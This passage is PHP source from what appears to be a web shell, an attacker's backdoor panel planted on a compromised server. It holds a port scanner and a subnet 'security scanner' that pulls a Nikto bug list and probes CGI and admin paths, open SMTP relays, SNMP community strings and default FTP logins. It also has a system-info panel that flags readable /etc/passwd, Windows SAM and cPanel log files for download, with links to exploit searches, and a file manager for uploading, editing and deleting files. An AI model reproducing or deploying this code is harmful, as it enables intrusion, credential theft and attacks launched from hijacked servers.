$target=$_REQUEST['target'];$from=(int) $_REQUEST['fromport'];$to=(int)$_REQUEST['toport'];$timeout=(int)$_REQUEST['timeout'];$nu = 0;
echo "&lt;font color=blue&gt;Port scanning started against ".htmlspecialchars($target).":&lt;br&gt;";
$start=time();
for($i=$from;$i&lt;=$to;$i++){
if($tcp){
if (checkthisporT($target,$i,$timeout)){
$nu++;
$ser="";
if(getservbyport($i,"tcp"))$ser="(".getservbyport($i,"tcp").")";
echo "$nu) $i $ser (&lt;a href=\"telnet://$target:$i\"&gt;Connect&lt;/a&gt;) [TCP]&lt;br&gt;";
}
}
if($udp)if(checkthisporT($target,$i,$timeout,1)){$nu++;$ser="";if(getservbyport($i,"udp"))$ser="(".getservbyport($i,"udp").")";echo "$nu) $i $ser [UDP]&lt;br&gt;";}
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)&lt;/font&gt;";
}
elseif (!empty($_REQUEST['securityscanner'])){
echo "&lt;font color=blue&gt;";
$start=time();
$from=$_REQUEST['from'];
$to=(int)$_REQUEST['to'];
$timeout=(int)$_REQUEST['timeout'];
$f = substr($from,strrpos($from,".")+1);
$from = substr($from,0,strrpos($from,"."));
if(!empty($_REQUEST['httpscanner'])){
echo "Loading webserver bug list...";
flusheR();
$buglist=whereistmP().DIRECTORY_SEPARATOR.namE();
$dl=@downloadiT('http://www.cirt.net/nikto/UPDATES/1.36/scan_database.db',$buglist);
if($dl){$file=file($buglist);echo "Done! scanning started.&lt;br&gt;&lt;br&gt;";}else echo "Failed!!! scanning started without webserver security testing...&lt;br&gt;&lt;br&gt;";
flusheR();
}else {$fr=htmlspecialchars($from); echo "Scanning $fr.$f-$fr.$to:&lt;br&gt;&lt;br&gt;";}
for($i=$f;$i&lt;=$to;$i++){
$output=0;
$ip="$from.$i";
if(!empty($_REQUEST['nslookup'])){
$hn=gethostbyaddr($ip);
if($hn!=$ip)echo "$ip [$hn]&lt;br&gt;";}
flusheR();
if(!empty($_REQUEST['ipscanner'])){
$port=$_REQUEST['port'];
if(strstr($port,","))$p=explode(",",$port);else $p[0]=$port;
$open=$ser="";
foreach($p as $po){
$scan=checkthisporT($ip,$po,$timeout);
if ($scan){
$ser="";
if($ser=getservbyport($po,"tcp"))$ser="($ser)";
$open.=" $po$ser ";
}
}
if($open){echo "$ip) Open ports:$open&lt;br&gt;";$output=1;}
flusheR();
}
if(!empty($_REQUEST['httpbanner'])){
$res=get_sw_namE($ip,$timeout);
if($res){
echo "$ip) Webserver software: ";
if($res==-1)echo "Unknow";
else echo $res;
echo "&lt;br&gt;";
$output=1;
}
flusheR();
}
if(!empty($_REQUEST['httpscanner'])){
if(checkthisporT($ip,80,$timeout) && !empty($file)){
$admin=array('/admin/','/adm/');
$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','smmsp','smtp','sshd','sys','test','unknown','uucp','web','www');
$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');
$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-local/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');
foreach ($file as $v){
$vuln=array();
$v=trim($v);
if(!$v || $v{0}=='#')continue;
$v=str_replace('","','^',$v);
$v=str_replace('"','',$v);
$vuln=explode('^',$v);
$page=$cqich=$nukech=$adminch=$userch=$vuln[1];
if(strstr($page,'@CGIDIRS'))
foreach($cgi as $cg){
$cqich=str_replace('@CGIDIRS',$cg,$page);
$url="http://$ip$cqich";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." &lt;a href=\"$url\" target=\"_blank\"&gt;$url&lt;/a&gt;&lt;br&gt;";}
flusheR();
}
elseif(strstr($page,'@ADMINDIRS'))
foreach ($admin as $cg){
$adminch=str_replace('@ADMINDIRS',$cg,$page);
$url="http://$ip$adminch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." &lt;a href=\"$url\" target=\"_blank\"&gt;$url&lt;/a&gt;&lt;br&gt;";}
flusheR();
}
elseif(strstr($page,'@USERS'))
foreach ($users as $cg){
$userch=str_replace('@USERS',$cg,$page);
$url="http://$ip$userch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." &lt;a href=\"$url\" target=\"_blank\"&gt;$url&lt;/a&gt;&lt;br&gt;";}
flusheR();
}
elseif(strstr($page,'@NUKE'))
foreach ($nuke as $cg){
$nukech=str_replace('@NUKE',$cg,$page);
$url="http://$ip$nukech";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." &lt;a href=\"$url\" target=\"_blank\"&gt;$url&lt;/a&gt;&lt;br&gt;";}
flusheR();
}
else{
$url="http://$ip$page";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." &lt;a href=\"$url\" target=\"_blank\"&gt;$url&lt;/a&gt;&lt;br&gt;";}
flusheR();
}
}
}
}
if(!empty($_REQUEST['smtprelay'])){
if(checkthisporT($ip,25,$timeout)){
$res='';
$res=checksmtP($ip,$timeout);
if($res==1){echo "$ip) SMTP relay found.&lt;br&gt;";$output=1;}flusheR();
}
}
if(!empty($_REQUEST['snmpscanner'])){
if(checkthisporT($ip,161,$timeout,1)){
$com=$_REQUEST['com'];
$coms=$res="";
if(strstr($com,","))$c=explode(",",$com);else $c[0]=$com;
foreach ($c as $v){
$ret=snmpchecK($ip,$v,$timeout);
if($ret)$coms .=" $v ";
}
if ($coms!=""){echo "$ip) SNMP FOUND: $coms&lt;br&gt;";$output=1;}
flusheR();
}
}
if(!empty($_REQUEST['ftpscanner'])){
if(checkthisporT($ip,21,$timeout)){
$usps=explode(',',$_REQUEST['userpass']);
foreach ($usps as $v){
$user=substr($v,0,strpos($v,':'));
$pass=substr($v,strpos($v,':')+1);
if($pass=='[BLANK]')$pass='';
$ftp=@ftp_connect($ip,21,$timeout);
if ($ftp){
if(@ftp_login($ftp,$user,$pass)){$output=1;echo "$ip) FTP FOUND: ($user:$pass) &lt;a href=\"ftp://$ip\" target=\"_blank\"&gt;$ip&lt;/a&gt; System type: ".ftp_systype($ftp)."&lt;br&gt;";}
}
flusheR();
}
}
}
if($output)echo "&lt;hr size=1 noshade&gt;";
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)&lt;/font&gt;";
if(!empty($buglist))unlink($buglist);
}
else{
$chbox=(extension_loaded('sockets'))?"&lt;input type=checkbox name=tcp value=1 checked&gt;TCP&lt;input type=checkbox name=udp value=1 checked&gt;UDP":"&lt;input type=hidden name=tcp value=1&gt;";
echo "&lt;center&gt;&lt;br&gt;&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"&gt;&lt;tr&gt;&lt;form method=\"POST\"&gt;&lt;td&gt;Port scanner:&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Target:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=80%&gt;&lt;input name=target value=$host size=40&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#666666\" width=25%&gt;From:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=25%&gt;&lt;input name=fromport type=text value=\"1\" size=5&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#808080\" width=25%&gt;To:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=25%&gt;&lt;input name=toport type=text value=\"1024\" size=5&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Timeout:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input name=timeout type=text value=\"2\" size=5&gt;&lt;/td&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;$chbox&lt;/td&gt;&lt;td bgcolor=\"#808080\" align=\"right\"&gt;$hcwd&lt;input type=submit class=buttons name=portscanner value=Scan&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;";
$host = substr($host,0,strrpos($host,"."));
echo "&lt;br&gt;&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"&gt;&lt;tr&gt;&lt;form method=\"POST\" name=security&gt;&lt;td&gt;security scanner:&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;From:&lt;/td&gt;&lt;td bgcolor=\"#808080\" width=80%&gt;&lt;input name=from value=$host.1 size=40&gt; &lt;input type=checkbox value=1 style=\"border-width:1px;background-color:#808080;\" name=nslookup checked&gt;NS lookup&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td bgcolor=\"#666666\" width=25%&gt;To:&lt;/td&gt;&lt;td bgcolor=\"#666666\" width=25%&gt;xxx.xxx.xxx.&lt;input name=to type=text value=254 size=4&gt;$hcwd&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Timeout:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input name=timeout type=text value=\"2\" size=5&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;&lt;input type=checkbox name=ipscanner value=1 checked onClick=\"document.security.port.disabled = !document.security.port.disabled;\" style=\"border-width:1px;background-color:#666666;\"&gt;Port scanner:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input name=port type=text value=\"21,23,25,80,110,135,139,143,443,445,1433,3306,3389,8080,65301\" size=60&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;&lt;input type=checkbox name=httpbanner value=1 checked style=\"border-width:1px;background-color:#808080;\"&gt;Get web banner&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input type=checkbox name=httpscanner value=1 checked style=\"border-width:1px;background-color:#808080;\"&gt;Webserver security scanning&nbsp;&nbsp;&nbsp;&lt;input type=checkbox name=smtprelay value=1 checked style=\"border-width:1px;background-color:#808080;\"&gt;SMTP relay check&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;&lt;input type=checkbox name=ftpscanner value=1 checked onClick=\"document.security.userpass.disabled = !document.security.userpass.disabled;\" style=\"border-width:1px;background-color:#666666;\"&gt;FTP password:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;&lt;input name=userpass type=text value=\"anonymous:admin@nasa.gov,ftp:ftp,Administrator:[BLANK],guest:[BLANK]\" size=60&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;&lt;input type=checkbox name=snmpscanner value=1 onClick=\"document.security.com.disabled = !document.security.com.disabled;\" checked style=\"border-width:1px;background-color:#808080;\"&gt;SNMP:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;input name=com type=text value=\"public,private,secret,cisco,write,test,guest,ilmi,ILMI,password,all private,admin,all,system,monitor,agent,manager,OrigEquipMfr,default,tivoli,openview,community,snmp,snmpd,Secret C0de,security,rmon,rmon_admin,hp_admin,NoGaH$@!,agent_steal,freekevin,0392a0,cable-docsis,fubar,ANYCOM,Cisco router,xyzzy,c,cc,cascade,yellow,blue,internal,comcomcom,apc,TENmanUFactOryPOWER,proxy,core,regional\" size=60&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;&lt;/td&gt;&lt;td bgcolor=\"#666666\" align=\"right\"&gt;&lt;input type=submit class=buttons name=securityscanner value=Scan&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;&lt;br&gt;&lt;center&gt;";
}
}
function sysinfO(){
global $windows,$disablefunctions,$safemode;
$cwd= getcwd();
$mil="&lt;a target=\"_blank\" href=\"http://www.milw0rm.org/related.php?program=";
$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
if (!empty($_SERVER["PROCESSOR_IDENTIFIER"])) $CPU = $_SERVER["PROCESSOR_IDENTIFIER"];
$osver=$tsize=$fsize='';
if ($windows){ 
$osver = "  (".shelL("ver").")";
$sysroot = shelL("echo %systemroot%");
if (empty($sysroot)) $sysroot = $_SERVER["SystemRoot"];
if (empty($sysroot)) $sysroot = getenv("windir");
if (empty($sysroot)) $sysroot = "Not Found";
if (empty($CPU))$CPU = shelL("echo %PROCESSOR_IDENTIFIER%");
for ($i=66;$i&lt;=90;$i++){
$drive= chr($i).':\\';
if (is_dir($drive)){
$fsize+=@disk_free_space($drive);
$tsize+=@disk_total_space($drive);
}
}
}else{
$fsize=disk_free_space('/');
$tsize=disk_total_space('/');
}
$disksize="Used spase: ". showsizE($tsize-$fsize) . "   Free space: ". showsizE($fsize) . "   Total space: ". showsizE($tsize);
if (empty($CPU)) $CPU = "Unknow";
$os = php_unamE();
$osn=php_unamE('s');
if(!$windows){ 
$ker = php_unamE('r');
$o=($osn=="Linux")?"Linux+Kernel":$osn;
$os = str_replace($osn,"${mil}$o\"&gt;$osn&lt;/a&gt;",$os);
$os = str_replace($ker,"${mil}Linux+Kernel\"&gt;$ker&lt;/a&gt;",$os);
$inpa=':';
}else{
$sam = $sysroot."\\system32\\config\\SAM";
$inpa=';';
$os = str_replace($osn,"${mil}MS+Windows\"&gt;$osn&lt;/a&gt;",$os);
}
$software=str_replace("Apache","${mil}Apache\"&gt;Apache&lt;/a&gt;",$_SERVER['SERVER_SOFTWARE']);
echo "&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"&gt;&lt;tr&gt;&lt;td&gt;Server information:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Server:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;".$_SERVER["HTTP_HOST"]; if (!empty($_SERVER["SERVER_ADDR"])){ echo "(". $_SERVER["SERVER_ADDR"] .")";}echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Operation system:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;$os$osver&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Web server application:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;$software&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;CPU:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;$CPU&lt;/td&gt;&lt;/tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Disk status:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;$disksize&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;User domain:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;";if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];else echo "Unknow"; echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;User name:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";$cuser=get_current_user();if (!empty($cuser)) echo get_current_user();else echo "Unknow"; echo "&lt;/td&gt;&lt;/tr&gt;";
if ($windows){
echo "&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Windows directory:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;a href=\"".hlinK("seC=fm&workingdiR=$sysroot")."\"&gt;$sysroot&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Sam file:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";if (is_readable(($sam)))echo "&lt;a href=\"".hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam")."\"&gt;Readable&lt;/a&gt;"; else echo "Not readable";echo "&lt;/td&gt;&lt;/tr&gt;";
}
else
{
echo "&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Passwd file:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;";
if (is_readable('/etc/passwd')) echo "&lt;a href=\"".hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd")."\"&gt;Readable&lt;/a&gt;"; else echo'Not readable';echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Cpanel log file:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";
if (file_exists("/var/cpanel/accounting.log")){if (is_readable("/var/cpanel/accounting.log")) echo "&lt;a href=\"".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."\"&gt;Readable&lt;/a&gt;"; else echo "Not readable";}else echo "Not found";
echo "&lt;/td&gt;&lt;/tr&gt;";
}
$uip =(!empty($_SERVER['REMOTE_ADDR']))?$_SERVER['REMOTE_ADDR']:getenv('REMOTE_ADDR');
echo "&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;${mil}PHP\"&gt;PHP&lt;/a&gt; version:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;&lt;a href=\"?=".php_logo_guid()."\" target=\"_blank\"&gt;".PHP_VERSION."&lt;/a&gt; (&lt;a href=\"".hlinK("seC=phpinfo&workingdiR=$cwd")."\"&gt;more...&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Zend version:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";if (function_exists('zend_version')) echo "&lt;a href=\"?=".zend_logo_guid()."\" target=\"_blank\"&gt;".zend_version()."&lt;/a&gt;";else echo "Not Found";echo "&lt;/td&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Include path:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;".str_replace($inpa," ",DEFAULT_INCLUDE_PATH)."&lt;/td&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;PHP Modules:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";$ext=get_loaded_extensions();foreach($ext as $v)echo $v." ";echo "&lt;/td&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Disabled functions:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;";if(!empty($disablefunctions))echo $disablefunctions;else echo "Nothing"; echo"&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;Safe mode:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;$safemode&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Open base dir:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;$basedir&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;DBMS:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;";$sq="";if(function_exists('mysql_connect')) $sq= "${mil}MySQL\"&gt;MySQL&lt;/a&gt; ";if(function_exists('mssql_connect')) $sq.= " ${mil}MSSQL\"&gt;MSSQL&lt;/a&gt; ";if(function_exists('ora_logon')) $sq.= " ${mil}Oracle\"&gt;Oracle&lt;/a&gt; ";if(function_exists('sqlite_open')) $sq.= " SQLite ";if(function_exists('pg_connect')) $sq.= " ${mil}PostgreSQL\"&gt;PostgreSQL&lt;/a&gt; ";if(function_exists('msql_connect')) $sq.= " mSQL ";if(function_exists('mysqli_connect'))$sq.= " MySQLi ";if(function_exists('ovrimos_connect')) $sq.= " Ovrimos SQL ";if ($sq=="") $sq= "Nothing"; echo "$sq&lt;/td&gt;&lt;/tr&gt;";if (function_exists('curl_init')) echo "&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;cURL support:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;Enabled ";if(function_exists('curl_version')){$ver=curl_version();echo "(Version:". $ver['version']." OpenSSL version:". $ver['ssl_version']." zlib version:". $ver['libz_version']." host:". $ver['host'] .")";}echo "&lt;/td&gt;&lt;/tr&gt;";echo "&lt;tr&gt;&lt;td&gt;User information:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#666666\"&gt;IP:&lt;/td&gt;&lt;td bgcolor=\"#666666\"&gt;$uip&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"25%\" bgcolor=\"#808080\"&gt;Agent:&lt;/td&gt;&lt;td bgcolor=\"#808080\"&gt;".getenv('HTTP_USER_AGENT')."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
}
function checksuM($file){
global $et;
echo "&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"&gt;&lt;tr&gt;&lt;td width=\"10%\" bgcolor=\"#666666\"&gt;&lt;b&gt;MD5:&lt;/b&gt; &lt;font color=#F0F0F0&gt;".md5_file($file)."&lt;/font&gt;&lt;br&gt;&lt;b&gt;SHA1:&lt;/b&gt; &lt;font color=#F0F0F0&gt;".sha1_file($file)."&lt;/font&gt;$et";
}
function listdiR($cwd,$task){
$c= getcwd();
$dh = opendir($cwd);
while ($cont=readdir($dh)){
if($cont=='.' || $cont=='..')continue;
$adr = $cwd.DIRECTORY_SEPARATOR.$cont;
switch ($task){
case '0':if(is_file($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";if(is_dir($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '1':if(is_writeable($adr))if(is_file($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";if(is_dir($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '2':if(is_file($adr) &&  is_writeable($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '3':if(is_dir($adr) && is_writeable($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '4':if(is_file($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '5':if(is_dir($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";break;
case '6':if(preg_match("@".$_REQUEST['search']."@",$cont)){if(is_file($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";if(is_dir($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";}break;
case '7':if(strstr($cont,$_REQUEST['search'])){if(is_file($adr))echo "[&lt;a href=\"".hlinK("seC=edit&filE=$adr&workingdiR=$c")."\"&gt;$adr&lt;/a&gt;]\n";if(is_dir($adr))echo "[&lt;a href=\"".hlinK("seC=fm&workingdiR=$adr")."\"&gt;$adr&lt;/a&gt;]\n";}break;
}
if (is_dir($adr)) listdiR($adr,$_REQUEST['task']);
}
}
if (!function_exists("posix_getpwuid") && !strstr($disablefunctions,'posix_getpwuid')) {function posix_getpwuid($u) {return 0;}}
if (!function_exists("posix_getgrgid") && !strstr($disablefunctions,'posix_getgrgid')) {function posix_getgrgid($g) {return 0;}}
function filemanager(){
global $windows,$msgbox,$errorbox,$t,$et,$hcwd;
$cwd= getcwd();
$table = "&lt;table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"&gt;";
$td1n="&lt;td width=\"22%\" bgcolor=\"#666666\"&gt;";
$td2m="&lt;td width=\"22%\" bgcolor=\"#808080\"&gt;";
$td1i="&lt;td width=\"5%\" bgcolor=\"#666666\"&gt;";
$td2i="&lt;td width=\"5%\" bgcolor=\"#808080\"&gt;";
$tdnr="&lt;td width=\"22%\" bgcolor=\"#800000\"&gt;";
$tdw="&lt;td width=\"22%\" bgcolor=\"#006E00\"&gt;";
if (!empty($_REQUEST['task'])){
if (!empty($_REQUEST['search'])) $_REQUEST['task'] = 7;
if (!empty($_REQUEST['re'])) $_REQUEST['task'] = 6;
echo "&lt;font color=blue&gt;&lt;pre&gt;";
listdiR($cwd,$_REQUEST['task']);
echo "&lt;/pre&gt;&lt;/font&gt;";
}else{
if (!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])|| !empty($_REQUEST['rN'])){
if (!empty($_REQUEST['cP']) || !empty($_REQUEST['mV'])){
$title="Destination";
$ad = (!empty($_REQUEST['cP']))?$_REQUEST['cP']:$_REQUEST['mV'];
$dis =(!empty($_REQUEST['cP']))?'Copy':'Move';
}else{
$ad = $_REQUEST['rN'];
$title ="New name";
$dis = "Rename";
}
if (!!empty($_REQUEST['deS'])){
echo "&lt;center&gt;&lt;table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"&gt;&lt;tr&gt;&lt;td width=\"100%\" bgcolor=\"#333333\"&gt;$title:&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td1n&lt;form method=\"POST\"&gt;&lt;input type=text value=\"";if(empty($_REQUEST['rN'])) echo $cwd; echo "\" size=60 name=deS&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;$td2m$hcwd&lt;input type=hidden value=\"".htmlspecialchars($ad)."\" name=cp&gt;&lt;input class=buttons type=submit value=$dis&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;";
}else{
if (!empty($_REQUEST['rN'])) renamE($ad,$_REQUEST['deS']);
else{
copy($ad,$_REQUEST['deS']);
if (!empty($_REQUEST['mV']))unlink($ad);
}
}
}
if (!empty($_REQUEST['deL'])) { if (is_file($_REQUEST['deL'])|| is_link($_REQUEST['deL'])) unlink($_REQUEST['deL']);elseif(is_dir($_REQUEST['deL'])) {
$dh = opendir($_REQUEST['deL']);
$d="";
while ($cont=readdir($dh)){$d++;}
if ($d&gt;2) echo "$errorbox\"".htmlspecialchars($_REQUEST['del'])."\" is not empty!&lt;td&gt;&lt;tr&gt;&lt;/table&gt;&lt;br&gt;";else rmdir($_REQUEST['del']);}}
if (!empty($_FILES['uploadfile'])){
move_uploaded_file($_FILES['uploadfile']['tmp_name'],$_FILES['uploadfile']['name']);
echo "$msgbox&lt;b&gt;Uploaded!&lt;/b&gt; File name: ".$_FILES['uploadfile']['name']." File size: ".$_FILES['uploadfile']['size']. "$et&lt;br&gt;";
}
$select = "&lt;select onChange=\"window.location=this.options[this.selectedIndex].value;\"&gt;&lt;option value=\"".hlinK("seC=fm&workingdiR=$cwd")."\"&gt;--------&lt;/option&gt;&lt;option value=\"";
if (!empty($_REQUEST['newf'])){
if (!empty($_REQUEST['newfile'])){file_put_contents($_REQUEST['newf'],"");}
if (!empty($_REQUEST['newdir'])){mkdir($_REQUEST['newf']);}
}
if ($windows){
echo "$table&lt;td&gt;&lt;b&gt;Drives:&lt;/b&gt; ";
for ($i=66;$i&lt;=90;$i++){$drive= chr($i).':';
if (is_dir($drive."\\")){$vol=shelL("vol $drive");if(empty($vol))$vol=$drive;echo " &lt;a title=\"$vol\" href=".hlinK("seC=fm&workingdiR=$drive\\")."&gt;$drive\\&lt;/a&gt;";}
}
echo $et;
}
echo "$table&lt;form method=\"POST\"&gt;&lt;tr&gt;&lt;td width=\"20%\"&gt;&lt;b&gt;Location:&lt;/b&gt;&lt;input type=text name=workingdiR size=135 value=\"".getcwd()."\"&gt;&lt;input class=buttons type=submit value=Change&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;";
$file=array();$dir=array();$link=array();
if($dirhandle = opendir($cwd)){
while ($cont=readdir($dirhandle)){
if (is_dir($cwd.DIRECTORY_SEPARATOR.$cont)) $dir[]= $cont;
elseif (is_file($cwd.DIRECTORY_SEPARATOR.$cont)) $file[]=$cont;
else $link[]=$cont;
}
closedir($dirhandle);
sort($file);sort($dir);sort($link);
